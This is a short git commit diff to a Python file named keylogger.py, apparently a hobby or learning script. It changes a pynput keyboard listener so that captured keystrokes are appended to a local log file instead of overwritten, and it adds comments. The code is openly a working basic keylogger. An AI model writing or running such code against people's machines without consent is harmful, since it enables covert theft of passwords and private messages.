22a9fab0de4e616d31b0ef7d293e940daaf4e25f
mr.white <mahesh3173399@gmail.com>
2025-03-28 15:46:01 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -7,17 +7,18 @@ def on_press(key):
     write_to_file(keys)
 
 def write_to_file(keys):
-    with open("keylogs.txt", "w") as f:
+    with open("keylogs.txt", "a") as f:  # Change "w" to "a" to append instead of overwrite
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-                f.write("\n")
+                f.write("\n")  # Write newline for space
             elif k.find("Key") == -1:
-                f.write(k)
+                f.write(k)  # Write actual key presses
+        keys.clear()  # Clear list to prevent duplicate entries
 
 def on_release(key):
     if key == Key.esc:
-        return False
+        return False  # Stop listener when Esc is pressed
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
